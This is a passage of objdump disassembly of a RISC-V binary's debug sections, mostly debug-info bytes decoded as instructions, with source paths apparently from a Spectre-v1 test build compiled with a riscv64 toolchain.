 280:	3a0e                	fld	fs4,224(sp)
 282:	390b3b0b          	0x390b3b0b
 286:	1119270b          	0x1119270b
 28a:	1201                	addi	tp,tp,-32
 28c:	97184007          	flq	ft0,-1679(a6)
 290:	1942                	slli	s2,s2,0x30
 292:	0000                	unimp
 294:	0100                	addi	s0,sp,128
 296:	0011                	c.nop	4
 298:	0610                	addi	a2,sp,768
 29a:	0111                	addi	sp,sp,4
 29c:	0112                	slli	sp,sp,0x4
 29e:	0e1b0e03          	lb	t3,225(s6)
 2a2:	0e25                	addi	t3,t3,9
 2a4:	00000513          	li	a0,0
 2a8:	0100                	addi	s0,sp,128
 2aa:	0011                	c.nop	4
 2ac:	0610                	addi	a2,sp,768
 2ae:	0111                	addi	sp,sp,4
 2b0:	0112                	slli	sp,sp,0x4
 2b2:	0e1b0e03          	lb	t3,225(s6)
 2b6:	0e25                	addi	t3,t3,9
 2b8:	00000513          	li	a0,0
 2bc:	0100                	addi	s0,sp,128
 2be:	0111                	addi	sp,sp,4
 2c0:	0e25                	addi	t3,t3,9
 2c2:	0e030b13          	addi	s6,t1,224
 2c6:	01110e1b          	addiw	t3,sp,17
 2ca:	0712                	slli	a4,a4,0x4
 2cc:	1710                	addi	a2,sp,928
 2ce:	0000                	unimp
 2d0:	2402                	fld	fs0,0(sp)
 2d2:	0b00                	addi	s0,sp,400
 2d4:	030b3e0b          	0x30b3e0b
 2d8:	000e                	c.slli	zero,0x3
 2da:	0300                	addi	s0,sp,384
 2dc:	0024                	addi	s1,sp,8
 2de:	0b3e0b0b          	0xb3e0b0b
 2e2:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
 2e6:	3504                	fld	fs1,40(a0)
 2e8:	4900                	lw	s0,16(a0)
 2ea:	05000013          	li	zero,80
 2ee:	0026                	c.slli	zero,0x9
 2f0:	1349                	addi	t1,t1,-14
 2f2:	0000                	unimp
 2f4:	1606                	slli	a2,a2,0x21
 2f6:	0300                	addi	s0,sp,384
 2f8:	3a0e                	fld	fs4,224(sp)
 2fa:	390b3b0b          	0x390b3b0b
 2fe:	0013490b          	0x13490b
 302:	0700                	addi	s0,sp,896
 304:	0016                	c.slli	zero,0x5
 306:	0b3a0e03          	lb	t3,179(s4)
 30a:	0b39053b          	0xb39053b
 30e:	1349                	addi	t1,t1,-14
 310:	0000                	unimp
 312:	1708                	addi	a0,sp,928
 314:	0b01                	addi	s6,s6,0
 316:	3b0b3a0b          	0x3b0b3a0b
 31a:	010b390b          	0x10b390b
 31e:	09000013          	li	zero,144
 322:	000d                	c.nop	3
 324:	0b3a0e03          	lb	t3,179(s4)
 328:	0b390b3b          	0xb390b3b
 32c:	1349                	addi	t1,t1,-14
 32e:	0000                	unimp
 330:	010a                	slli	sp,sp,0x2
 332:	4901                	li	s2,0
 334:	00130113          	addi	sp,t1,1
 338:	0b00                	addi	s0,sp,400
 33a:	0021                	c.nop	8
 33c:	1349                	addi	t1,t1,-14
 33e:	00000b2f          	0xb2f
 342:	130c                	addi	a1,sp,416
 344:	0b01                	addi	s6,s6,0
 346:	3b0b3a0b          	0x3b0b3a0b
 34a:	010b390b          	0x10b390b
 34e:	0d000013          	li	zero,208
 352:	000d                	c.nop	3
 354:	0b3a0e03          	lb	t3,179(s4)
 358:	0b390b3b          	0xb390b3b
 35c:	1349                	addi	t1,t1,-14
 35e:	0b38                	addi	a4,sp,408
 360:	0000                	unimp
 362:	0f0e                	slli	t5,t5,0x3
 364:	0b00                	addi	s0,sp,400
 366:	0f00000b          	0xf00000b
 36a:	0b0b000f          	0xb0b000f
 36e:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 372:	1310                	addi	a2,sp,416
 374:	0301                	addi	t1,t1,0
 376:	0b0e                	slli	s6,s6,0x3
 378:	3b0b3a0b          	0x3b0b3a0b
 37c:	010b390b          	0x10b390b
 380:	11000013          	li	zero,272
 384:	000d                	c.nop	3
 386:	0b3a0803          	lb	a6,179(s4)
 38a:	0b390b3b          	0xb390b3b
 38e:	1349                	addi	t1,t1,-14
 390:	0b38                	addi	a4,sp,408
 392:	0000                	unimp
 394:	0f12                	slli	t5,t5,0x4
 396:	0b00                	addi	s0,sp,400
 398:	0013490b          	0x13490b
 39c:	1300                	addi	s0,sp,416
 39e:	0e030113          	addi	sp,t1,224
 3a2:	0b3a050b          	0xb3a050b
 3a6:	0b390b3b          	0xb390b3b
 3aa:	1301                	addi	t1,t1,-32
 3ac:	0000                	unimp
 3ae:	0d14                	addi	a3,sp,656
 3b0:	0300                	addi	s0,sp,384
 3b2:	3a0e                	fld	fs4,224(sp)
 3b4:	390b3b0b          	0x390b3b0b
 3b8:	3813490b          	0x3813490b
 3bc:	0005                	c.nop	1
 3be:	1500                	addi	s0,sp,672
 3c0:	0015                	c.nop	5
 3c2:	00001927          	0x1927
 3c6:	1516                	slli	a0,a0,0x25
 3c8:	2701                	sext.w	a4,a4
 3ca:	4919                	li	s2,6
 3cc:	00130113          	addi	sp,t1,1
 3d0:	1700                	addi	s0,sp,928
 3d2:	0005                	c.nop	1
 3d4:	1349                	addi	t1,t1,-14
 3d6:	0000                	unimp
 3d8:	1318                	addi	a4,sp,416
 3da:	0301                	addi	t1,t1,0
 3dc:	0b0e                	slli	s6,s6,0x3
 3de:	3a05                	addiw	s4,s4,-31
 3e0:	39053b0b          	0x39053b0b
 3e4:	0013010b          	0x13010b
 3e8:	1900                	addi	s0,sp,176
 3ea:	000d                	c.nop	3
 3ec:	0b3a0e03          	lb	t3,179(s4)
 3f0:	0b39053b          	0xb39053b
 3f4:	1349                	addi	t1,t1,-14
 3f6:	0b38                	addi	a4,sp,408
 3f8:	0000                	unimp
 3fa:	0d1a                	slli	s10,s10,0x6
 3fc:	0300                	addi	s0,sp,384
 3fe:	3a0e                	fld	fs4,224(sp)
 400:	39053b0b          	0x39053b0b
 404:	3813490b          	0x3813490b
 408:	0005                	c.nop	1
 40a:	1b00                	addi	s0,sp,432
 40c:	0e030113          	addi	sp,t1,224
 410:	0b3a0b0b          	0xb3a0b0b
 414:	0b39053b          	0xb39053b
 418:	1301                	addi	t1,t1,-32
 41a:	0000                	unimp
 41c:	131c                	addi	a5,sp,416
 41e:	0b01                	addi	s6,s6,0
 420:	3b0b3a0b          	0x3b0b3a0b
 424:	3905                	addiw	s2,s2,-31
 426:	0013010b          	0x13010b
 42a:	1d00                	addi	s0,sp,688
 42c:	050b0113          	addi	sp,s6,80
 430:	0b3a                	slli	s6,s6,0xe
 432:	0b39053b          	0xb39053b
 436:	1301                	addi	t1,t1,-32
 438:	0000                	unimp
 43a:	171e                	slli	a4,a4,0x27
 43c:	0b01                	addi	s6,s6,0
 43e:	3a05                	addiw	s4,s4,-31
 440:	39053b0b          	0x39053b0b
 444:	0013010b          	0x13010b
 448:	1f00                	addi	s0,sp,944
 44a:	000d                	c.nop	3
 44c:	0b3a0e03          	lb	t3,179(s4)
 450:	0b39053b          	0xb39053b
 454:	1349                	addi	t1,t1,-14
 456:	0000                	unimp
 458:	1320                	addi	s0,sp,424
 45a:	0300                	addi	s0,sp,384
 45c:	3c0e                	fld	fs8,224(sp)
 45e:	0019                	c.nop	6
 460:	2100                	fld	fs0,0(a0)
 462:	0115                	addi	sp,sp,5
 464:	13011927          	0x13011927
 468:	0000                	unimp
 46a:	3422                	fld	fs0,40(sp)
 46c:	0300                	addi	s0,sp,384
 46e:	3a0e                	fld	fs4,224(sp)
 470:	39053b0b          	0x39053b0b
 474:	3f13490b          	0x3f13490b
 478:	3c19                	addiw	s8,s8,-26
 47a:	0019                	c.nop	6
 47c:	2300                	fld	fs0,0(a4)
 47e:	0034                	addi	a3,sp,8
 480:	0b3a0e03          	lb	t3,179(s4)
 484:	0b390b3b          	0xb390b3b
 488:	1349                	addi	t1,t1,-14
 48a:	193c193f 34240000 	0x34240000193c193f
 492:	0300                	addi	s0,sp,384
 494:	3a0e                	fld	fs4,224(sp)
 496:	390b3b0b          	0x390b3b0b
 49a:	0213490b          	0x213490b
 49e:	0018                	0x18
 4a0:	2500                	fld	fs0,8(a0)
 4a2:	012e                	slli	sp,sp,0xb
 4a4:	0e03193f 053b0b3a 	0x53b0b3a0e03193f
 4ac:	0b39                	addi	s6,s6,14
 4ae:	13491927          	0x13491927
 4b2:	0111                	addi	sp,sp,4
 4b4:	0712                	slli	a4,a4,0x4
 4b6:	1840                	addi	s0,sp,52
 4b8:	01194297          	auipc	t0,0x1194
 4bc:	26000013          	li	zero,608
 4c0:	0005                	c.nop	1
 4c2:	0b3a0803          	lb	a6,179(s4)
 4c6:	0b39053b          	0xb39053b
 4ca:	1349                	addi	t1,t1,-14
 4cc:	1802                	slli	a6,a6,0x20
 4ce:	0000                	unimp
 4d0:	03003427          	fsd	fa6,40(zero) # 28 <_tdata_begin+0x28>
 4d4:	3a08                	fld	fa0,48(a2)
 4d6:	39053b0b          	0x39053b0b
 4da:	0213490b          	0x213490b
 4de:	0018                	0x18
 4e0:	2800                	fld	fs0,16(s0)
 4e2:	0034                	addi	a3,sp,8
 4e4:	0b3a0e03          	lb	t3,179(s4)
 4e8:	0b39053b          	0xb39053b
 4ec:	1349                	addi	t1,t1,-14
 4ee:	1802                	slli	a6,a6,0x20
 4f0:	0000                	unimp
 4f2:	2e29                	addiw	t3,t3,10
 4f4:	3f01                	addiw	t5,t5,-32
 4f6:	0319                	addi	t1,t1,6
 4f8:	3a0e                	fld	fs4,224(sp)
 4fa:	390b3b0b          	0x390b3b0b
 4fe:	4919270b          	0x4919270b
 502:	12011113          	0x12011113
 506:	97184007          	flq	ft0,-1679(a6)
 50a:	1942                	slli	s2,s2,0x30
 50c:	1301                	addi	t1,t1,-32
 50e:	0000                	unimp
 510:	052a                	slli	a0,a0,0xa
 512:	0300                	addi	s0,sp,384
 514:	3a0e                	fld	fs4,224(sp)
 516:	39053b0b          	0x39053b0b
 51a:	0213490b          	0x213490b
 51e:	0018                	0x18
 520:	2b00                	fld	fs0,16(a4)
 522:	0111010b          	0x111010b
 526:	0712                	slli	a4,a4,0x4
 528:	1301                	addi	t1,t1,-32
 52a:	0000                	unimp
 52c:	0b2c                	addi	a1,sp,408
 52e:	1101                	addi	sp,sp,-32
 530:	1201                	addi	tp,tp,-32
 532:	2d000007          	0x2d000007
 536:	0026                	c.slli	zero,0x9
 538:	0000                	unimp
 53a:	2e2e                	fld	ft8,200(sp)
 53c:	3f01                	addiw	t5,t5,-32
 53e:	0319                	addi	t1,t1,6
 540:	3a0e                	fld	fs4,224(sp)
 542:	390b3b0b          	0x390b3b0b
 546:	4919270b          	0x4919270b
 54a:	12011113          	0x12011113
 54e:	96184007          	flq	ft0,-1695(a6)
 552:	1942                	slli	s2,s2,0x30
 554:	1301                	addi	t1,t1,-32
 556:	0000                	unimp
 558:	0000182f          	0x182f
 55c:	3000                	fld	fs0,32(s0)
 55e:	012e                	slli	sp,sp,0xb
 560:	0b3a0e03          	lb	t3,179(s4)
 564:	0b39053b          	0xb39053b
 568:	01111927          	0x1111927
 56c:	0712                	slli	a4,a4,0x4
 56e:	1840                	addi	s0,sp,52
 570:	1848                	addi	a0,sp,52
 572:	00194297          	auipc	t0,0x194
 576:	3100                	fld	fs0,32(a0)
 578:	012e                	slli	sp,sp,0xb
 57a:	0b3a0e03          	lb	t3,179(s4)
 57e:	0b390b3b          	0xb390b3b
 582:	01111927          	0x1111927
 586:	0712                	slli	a4,a4,0x4
 588:	1840                	addi	s0,sp,52
 58a:	4296                	lw	t0,68(sp)
 58c:	0119                	addi	sp,sp,6
 58e:	32000013          	li	zero,800
 592:	0005                	c.nop	1
 594:	0b3a0e03          	lb	t3,179(s4)
 598:	0b390b3b          	0xb390b3b
 59c:	1349                	addi	t1,t1,-14
 59e:	1802                	slli	a6,a6,0x20
 5a0:	0000                	unimp
 5a2:	03000533          	mul	a0,zero,a6
 5a6:	3a08                	fld	fa0,48(a2)
 5a8:	390b3b0b          	0x390b3b0b
 5ac:	0213490b          	0x213490b
 5b0:	0018                	0x18
 5b2:	3400                	fld	fs0,40(s0)
 5b4:	0034                	addi	a3,sp,8
 5b6:	0b3a0803          	lb	a6,179(s4)
 5ba:	0b390b3b          	0xb390b3b
 5be:	1349                	addi	t1,t1,-14
 5c0:	1802                	slli	a6,a6,0x20
 5c2:	0000                	unimp
 5c4:	3435                	addiw	s0,s0,-19
 5c6:	0300                	addi	s0,sp,384
 5c8:	3a08                	fld	fa0,48(a2)
 5ca:	390b3b0b          	0x390b3b0b
 5ce:	0013490b          	0x13490b
 5d2:	3600                	fld	fs0,40(a2)
 5d4:	000a                	c.slli	zero,0x2
 5d6:	0b3a0e03          	lb	t3,179(s4)
 5da:	0b390b3b          	0xb390b3b
 5de:	0111                	addi	sp,sp,4
 5e0:	0000                	unimp
 5e2:	03000a37          	lui	s4,0x3000
 5e6:	3a0e                	fld	fs4,224(sp)
 5e8:	39053b0b          	0x39053b0b
 5ec:	0001110b          	0x1110b
 5f0:	3800                	fld	fs0,48(s0)
 5f2:	012e                	slli	sp,sp,0xb
 5f4:	0b3a0e03          	lb	t3,179(s4) # 30000b3 <_tbss_end+0x300002f>
 5f8:	0b390b3b          	0xb390b3b
 5fc:	13491927          	0x13491927
 600:	0111                	addi	sp,sp,4
 602:	0712                	slli	a4,a4,0x4
 604:	1840                	addi	s0,sp,52
 606:	01194297          	auipc	t0,0x1194
 60a:	39000013          	li	zero,912
 60e:	012e                	slli	sp,sp,0xb
 610:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 618:	0b39                	addi	s6,s6,14
 61a:	01111927          	0x1111927
 61e:	0712                	slli	a4,a4,0x4
 620:	1840                	addi	s0,sp,52
 622:	4296                	lw	t0,68(sp)
 624:	0119                	addi	sp,sp,6
 626:	3a000013          	li	zero,928
 62a:	0034                	addi	a3,sp,8
 62c:	0b3a0803          	lb	a6,179(s4)
 630:	0b390b3b          	0xb390b3b
 634:	1349                	addi	t1,t1,-14
 636:	0188                	addi	a0,sp,192
 638:	3b00000b          	0x3b00000b
 63c:	0034                	addi	a3,sp,8
 63e:	0b3a0e03          	lb	t3,179(s4)
 642:	0b390b3b          	0xb390b3b
 646:	1349                	addi	t1,t1,-14
 648:	0000                	unimp
 64a:	343c                	fld	fa5,104(s0)
 64c:	0300                	addi	s0,sp,384
 64e:	3a08                	fld	fa0,48(a2)
 650:	390b3b0b          	0x390b3b0b
 654:	8813490b          	0x8813490b
 658:	0b01                	addi	s6,s6,0
 65a:	1802                	slli	a6,a6,0x20
 65c:	0000                	unimp
 65e:	2e3d                	addiw	t3,t3,15
 660:	0301                	addi	t1,t1,0
 662:	3a0e                	fld	fs4,224(sp)
 664:	390b3b0b          	0x390b3b0b
 668:	1201110b          	0x1201110b
 66c:	96184007          	flq	ft0,-1695(a6)
 670:	1942                	slli	s2,s2,0x30
 672:	1301                	addi	t1,t1,-32
 674:	0000                	unimp
 676:	2e3e                	fld	ft8,456(sp)
 678:	3f01                	addiw	t5,t5,-32
 67a:	0319                	addi	t1,t1,6
 67c:	3a0e                	fld	fs4,224(sp)
 67e:	390b3b0b          	0x390b3b0b
 682:	1119270b          	0x1119270b
 686:	1201                	addi	tp,tp,-32
 688:	97184007          	flq	ft0,-1679(a6)
 68c:	1942                	slli	s2,s2,0x30
 68e:	1301                	addi	t1,t1,-32
 690:	0000                	unimp
 692:	3f002e3f 3a0e0319 	0x3a0e03193f002e3f
 69a:	390b3b0b          	0x390b3b0b
 69e:	1201110b          	0x1201110b
 6a2:	96184007          	flq	ft0,-1695(a6)
 6a6:	1942                	slli	s2,s2,0x30
 6a8:	0000                	unimp
 6aa:	2e40                	fld	fs0,152(a2)
 6ac:	3f01                	addiw	t5,t5,-32
 6ae:	0319                	addi	t1,t1,6
 6b0:	3a0e                	fld	fs4,224(sp)
 6b2:	390b3b0b          	0x390b3b0b
 6b6:	8719270b          	0x8719270b
 6ba:	1901                	addi	s2,s2,-32
 6bc:	0111                	addi	sp,sp,4
 6be:	0712                	slli	a4,a4,0x4
 6c0:	1840                	addi	s0,sp,52
 6c2:	4296                	lw	t0,68(sp)
 6c4:	0119                	addi	sp,sp,6
 6c6:	41000013          	li	zero,1040
 6ca:	012e                	slli	sp,sp,0xb
 6cc:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 6d4:	0b39                	addi	s6,s6,14
 6d6:	01871927          	0x1871927
 6da:	1119                	addi	sp,sp,-26
 6dc:	1201                	addi	tp,tp,-32
 6de:	97184007          	flq	ft0,-1679(a6)
 6e2:	1942                	slli	s2,s2,0x30
 6e4:	1301                	addi	t1,t1,-32
 6e6:	0000                	unimp
 6e8:	3442                	fld	fs0,48(sp)
 6ea:	0300                	addi	s0,sp,384
 6ec:	3a0e                	fld	fs4,224(sp)
 6ee:	390b3b0b          	0x390b3b0b
 6f2:	8813490b          	0x8813490b
 6f6:	0b01                	addi	s6,s6,0
 6f8:	1802                	slli	a6,a6,0x20
 6fa:	0000                	unimp
 6fc:	03012e43          	fmadd.d	ft8,ft2,fa6,ft0,rdn
 700:	3a0e                	fld	fs4,224(sp)
 702:	390b3b0b          	0x390b3b0b
 706:	1119270b          	0x1119270b
 70a:	1201                	addi	tp,tp,-32
 70c:	97184007          	flq	ft0,-1679(a6)
 710:	1942                	slli	s2,s2,0x30
 712:	1301                	addi	t1,t1,-32
 714:	0000                	unimp
 716:	2e44                	fld	fs1,152(a2)
 718:	0301                	addi	t1,t1,0
 71a:	3a0e                	fld	fs4,224(sp)
 71c:	390b3b0b          	0x390b3b0b
 720:	1119270b          	0x1119270b
 724:	1201                	addi	tp,tp,-32
 726:	97184007          	flq	ft0,-1679(a6)
 72a:	1942                	slli	s2,s2,0x30
 72c:	0000                	unimp
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	002c                	addi	a1,sp,8
   2:	0000                	unimp
   4:	0002                	c.slli64	zero
   6:	0000                	unimp
   8:	0000                	unimp
   a:	0008                	0x8
   c:	0000                	unimp
   e:	0000                	unimp
  10:	1048                	addi	a0,sp,36
  12:	8000                	0x8000
  14:	0000                	unimp
  16:	0000                	unimp
  18:	0588                	addi	a0,sp,704
	...
  2e:	0000                	unimp
  30:	002c                	addi	a1,sp,8
  32:	0000                	unimp
  34:	0002                	c.slli64	zero
  36:	0e4d                	addi	t3,t3,19
  38:	0000                	unimp
  3a:	0008                	0x8
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	0000                	unimp
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	01c6                	slli	gp,gp,0x11
	...
  5e:	0000                	unimp
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0002                	c.slli64	zero
  66:	00000e7b          	0xe7b
  6a:	0008                	0x8
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	15d0                	addi	a2,sp,740
  72:	8000                	0x8000
  74:	0000                	unimp
  76:	0000                	unimp
  78:	002e                	c.slli	zero,0xb
	...
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0002                	c.slli64	zero
  96:	0ea9                	addi	t4,t4,10
  98:	0000                	unimp
  9a:	0008                	0x8
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	15fe                	slli	a1,a1,0x3f
  a2:	8000                	0x8000
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	1214                	addi	a3,sp,288
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	0760                	addi	s0,sp,908
       2:	0000                	unimp
       4:	01e20003          	lb	zero,30(tp) # ffffffffffff901e <_end+0xffffffff7ffddb5e>
       8:	0000                	unimp
       a:	0101                	addi	sp,sp,0
       c:	000d0efb          	0xd0efb
      10:	0101                	addi	sp,sp,0
      12:	0101                	addi	sp,sp,0
      14:	0000                	unimp
      16:	0100                	addi	s0,sp,128
      18:	0000                	unimp
      1a:	6901                	0x6901
      1c:	636e                	ld	t1,216(sp)
      1e:	7300                	ld	s0,32(a4)
      20:	6372                	ld	t1,280(sp)
      22:	2f00                	fld	fs0,24(a4)
      24:	6f68                	ld	a0,216(a4)
      26:	656d                	lui	a0,0x1b
      28:	6568632f          	0x6568632f
      2c:	676e                	ld	a4,216(sp)
      2e:	6978                	ld	a4,208(a0)
      30:	6f61                	lui	t5,0x18
      32:	7579                	lui	a0,0xffffe
      34:	6968632f          	0x6968632f
      38:	7970                	ld	a2,240(a0)
      3a:	7261                	lui	tp,0xffff8
      3c:	2f64                	fld	fs1,216(a4)
      3e:	632e                	ld	t1,200(sp)
      40:	61646e6f          	jal	t3,46656 <_tbss_end+0x465d2>
      44:	652d                	lui	a0,0xb
      46:	766e                	ld	a2,248(sp)
      48:	7369722f          	0x7369722f
      4c:	742d7663          	bgeu	s10,sp,798 <_tbss_end+0x714>
      50:	736c6f6f          	jal	t5,c6786 <_tbss_end+0xc6702>
      54:	7369722f          	0x7369722f
      58:	34367663          	bgeu	a2,gp,3a4 <_tbss_end+0x320>
      5c:	752d                	lui	a0,0xfffeb
      5e:	6b6e                	ld	s6,216(sp)
      60:	6f6e                	ld	t5,216(sp)
      62:	652d6e77          	0x652d6e77
      66:	666c                	ld	a1,200(a2)
      68:	636e692f          	0x636e692f
      6c:	756c                	ld	a1,232(a0)
      6e:	6564                	ld	s1,200(a0)
      70:	63616d2f          	0x63616d2f
      74:	6968                	ld	a0,208(a0)
      76:	656e                	ld	a0,216(sp)
      78:	2f00                	fld	fs0,24(a4)
      7a:	6f68                	ld	a0,216(a4)
      7c:	656d                	lui	a0,0x1b
      7e:	6568632f          	0x6568632f
      82:	676e                	ld	a4,216(sp)
      84:	6978                	ld	a4,208(a0)
      86:	6f61                	lui	t5,0x18
      88:	7579                	lui	a0,0xffffe
      8a:	6968632f          	0x6968632f
      8e:	7970                	ld	a2,240(a0)
      90:	7261                	lui	tp,0xffff8
      92:	2f64                	fld	fs1,216(a4)
      94:	632e                	ld	t1,200(sp)
      96:	61646e6f          	jal	t3,466ac <_tbss_end+0x46628>
      9a:	652d                	lui	a0,0xb
      9c:	766e                	ld	a2,248(sp)
      9e:	7369722f          	0x7369722f
      a2:	742d7663          	bgeu	s10,sp,7ee <_tbss_end+0x76a>
      a6:	736c6f6f          	jal	t5,c67dc <_tbss_end+0xc6758>
      aa:	62696c2f          	0x62696c2f
      ae:	6363672f          	0x6363672f
      b2:	7369722f          	0x7369722f
      b6:	34367663          	bgeu	a2,gp,402 <_tbss_end+0x37e>
      ba:	752d                	lui	a0,0xfffeb
      bc:	6b6e                	ld	s6,216(sp)
      be:	6f6e                	ld	t5,216(sp)
      c0:	652d6e77          	0x652d6e77
      c4:	666c                	ld	a1,200(a2)
      c6:	322e392f          	0x322e392f
      ca:	302e                	fld	ft0,232(sp)
      cc:	636e692f          	0x636e692f
      d0:	756c                	ld	a1,232(a0)
      d2:	6564                	ld	s1,200(a0)
      d4:	2f00                	fld	fs0,24(a4)
      d6:	6f68                	ld	a0,216(a4)
      d8:	656d                	lui	a0,0x1b
      da:	6568632f          	0x6568632f
      de:	676e                	ld	a4,216(sp)
      e0:	6978                	ld	a4,208(a0)
      e2:	6f61                	lui	t5,0x18
      e4:	7579                	lui	a0,0xffffe
      e6:	6968632f          	0x6968632f
      ea:	7970                	ld	a2,240(a0)
      ec:	7261                	lui	tp,0xffff8
      ee:	2f64                	fld	fs1,216(a4)
      f0:	632e                	ld	t1,200(sp)
      f2:	61646e6f          	jal	t3,46708 <_tbss_end+0x46684>
      f6:	652d                	lui	a0,0xb
      f8:	766e                	ld	a2,248(sp)
      fa:	7369722f          	0x7369722f
      fe:	742d7663          	bgeu	s10,sp,84a <_tbss_end+0x7c6>
     102:	736c6f6f          	jal	t5,c6838 <_tbss_end+0xc67b4>
     106:	7369722f          	0x7369722f
     10a:	34367663          	bgeu	a2,gp,456 <_tbss_end+0x3d2>
     10e:	752d                	lui	a0,0xfffeb
     110:	6b6e                	ld	s6,216(sp)
     112:	6f6e                	ld	t5,216(sp)
     114:	652d6e77          	0x652d6e77
     118:	666c                	ld	a1,200(a2)
     11a:	636e692f          	0x636e692f
     11e:	756c                	ld	a1,232(a0)
     120:	6564                	ld	s1,200(a0)
     122:	7379732f          	0x7379732f
     126:	2f00                	fld	fs0,24(a4)
     128:	6f68                	ld	a0,216(a4)
     12a:	656d                	lui	a0,0x1b
     12c:	6568632f          	0x6568632f
     130:	676e                	ld	a4,216(sp)
     132:	6978                	ld	a4,208(a0)
     134:	6f61                	lui	t5,0x18
     136:	7579                	lui	a0,0xffffe
     138:	6968632f          	0x6968632f
     13c:	7970                	ld	a2,240(a0)
     13e:	7261                	lui	tp,0xffff8
     140:	2f64                	fld	fs1,216(a4)
     142:	632e                	ld	t1,200(sp)
     144:	61646e6f          	jal	t3,4675a <_tbss_end+0x466d6>
     148:	652d                	lui	a0,0xb
     14a:	766e                	ld	a2,248(sp)
     14c:	7369722f          	0x7369722f
     150:	742d7663          	bgeu	s10,sp,89c <_tbss_end+0x818>
     154:	736c6f6f          	jal	t5,c688a <_tbss_end+0xc6806>
     158:	7369722f          	0x7369722f
     15c:	34367663          	bgeu	a2,gp,4a8 <_tbss_end+0x424>
     160:	752d                	lui	a0,0xfffeb
     162:	6b6e                	ld	s6,216(sp)
     164:	6f6e                	ld	t5,216(sp)
     166:	652d6e77          	0x652d6e77
     16a:	666c                	ld	a1,200(a2)
     16c:	636e692f          	0x636e692f
     170:	756c                	ld	a1,232(a0)
     172:	6564                	ld	s1,200(a0)
     174:	0000                	unimp
     176:	68636163          	bltu	t1,t1,7f8 <_tbss_end+0x774>
     17a:	2e65                	addiw	t3,t3,25
     17c:	0068                	addi	a0,sp,12
     17e:	0001                	nop
     180:	7300                	ld	s0,32(a4)
     182:	6570                	ld	a2,200(a0)
     184:	65727463          	bgeu	tp,s7,7cc <_tbss_end+0x748>
     188:	762d                	lui	a2,0xfffeb
     18a:	2e31                	addiw	t3,t3,12
     18c:	00020063          	beqz	tp,18c <_tbss_end+0x108>
     190:	5f00                	lw	s0,56(a4)
     192:	6564                	ld	s1,200(a0)
     194:	6166                	ld	sp,88(sp)
     196:	6c75                	lui	s8,0x1d
     198:	5f74                	lw	a3,124(a4)
     19a:	7974                	ld	a3,240(a0)
     19c:	6570                	ld	a2,200(a0)
     19e:	00682e73          	csrrs	t3,0x6,a6
     1a2:	73000003          	lb	zero,1840(zero) # 730 <_tbss_end+0x6ac>
     1a6:	6474                	ld	a3,200(s0)
     1a8:	6564                	ld	s1,200(a0)
     1aa:	2e66                	fld	ft8,88(sp)
     1ac:	0068                	addi	a0,sp,12
     1ae:	0004                	0x4
     1b0:	5f00                	lw	s0,56(a4)
     1b2:	7974                	ld	a3,240(a0)
     1b4:	6570                	ld	a2,200(a0)
     1b6:	00682e73          	csrrs	t3,0x6,a6
     1ba:	0005                	c.nop	1
     1bc:	7200                	ld	s0,32(a2)
     1be:	6565                	lui	a0,0x19
     1c0:	746e                	ld	s0,248(sp)
     1c2:	682e                	ld	a6,200(sp)
     1c4:	0500                	addi	s0,sp,640
     1c6:	0000                	unimp
     1c8:	6f6c                	ld	a1,216(a4)
     1ca:	682e6b63          	bltu	t3,sp,860 <_tbss_end+0x7dc>
     1ce:	0500                	addi	s0,sp,640
     1d0:	0000                	unimp
     1d2:	735f 6474 6e69      	0x6e696474735f
     1d8:	2e74                	fld	fa3,216(a2)
     1da:	0068                	addi	a0,sp,12
     1dc:	0005                	c.nop	1
     1de:	7300                	ld	s0,32(a4)
     1e0:	6474                	ld	a3,200(s0)
     1e2:	696c                	ld	a1,208(a0)
     1e4:	2e62                	fld	ft8,24(sp)
     1e6:	0068                	addi	a0,sp,12
     1e8:	0006                	c.slli	zero,0x1
     1ea:	0000                	unimp
     1ec:	0105                	addi	sp,sp,1
     1ee:	0900                	addi	s0,sp,144
     1f0:	4802                	lw	a6,0(sp)
     1f2:	0010                	0x10
     1f4:	0080                	addi	s0,sp,64
     1f6:	0000                	unimp
     1f8:	0300                	addi	s0,sp,384
     1fa:	00c6                	slli	ra,ra,0x11
     1fc:	0501                	addi	a0,a0,0
     1fe:	030e                	slli	t1,t1,0x3
     200:	0905                	addi	s2,s2,1
     202:	000e                	c.slli	zero,0x3
     204:	0501                	addi	a0,a0,0
     206:	030d                	addi	t1,t1,3
     208:	0901                	addi	s2,s2,0
     20a:	000a                	c.slli	zero,0x2
     20c:	0501                	addi	a0,a0,0
     20e:	0308                	addi	a0,sp,384
     210:	0900                	addi	s0,sp,144
     212:	0008                	0x8
     214:	0501                	addi	a0,a0,0
     216:	0316                	slli	t1,t1,0x5
     218:	0902                	c.slli64	s2
     21a:	0002                	c.slli64	zero
     21c:	0501                	addi	a0,a0,0
     21e:	0308                	addi	a0,sp,384
     220:	000a0903          	lb	s2,0(s4)
     224:	0501                	addi	a0,a0,0
     226:	0316                	slli	t1,t1,0x5
     228:	000c0903          	lb	s2,0(s8) # 1d000 <_tbss_end+0x1cf7c>
     22c:	0501                	addi	a0,a0,0
     22e:	030d                	addi	t1,t1,3
     230:	0906                	slli	s2,s2,0x1
     232:	0008                	0x8
     234:	0501                	addi	a0,a0,0
     236:	031d                	addi	t1,t1,7
     238:	0906                	slli	s2,s2,0x1
     23a:	0004                	0x4
     23c:	0501                	addi	a0,a0,0
     23e:	0331                	addi	t1,t1,12
     240:	0900                	addi	s0,sp,144
     242:	0008                	0x8
     244:	0501                	addi	a0,a0,0
     246:	030e                	slli	t1,t1,0x3
     248:	0900                	addi	s0,sp,144
     24a:	0004                	0x4
     24c:	0501                	addi	a0,a0,0
     24e:	09030313          	addi	t1,t1,144
     252:	0008                	0x8
     254:	0501                	addi	a0,a0,0
     256:	0305                	addi	t1,t1,1
     258:	0900                	addi	s0,sp,144
     25a:	0004                	0x4
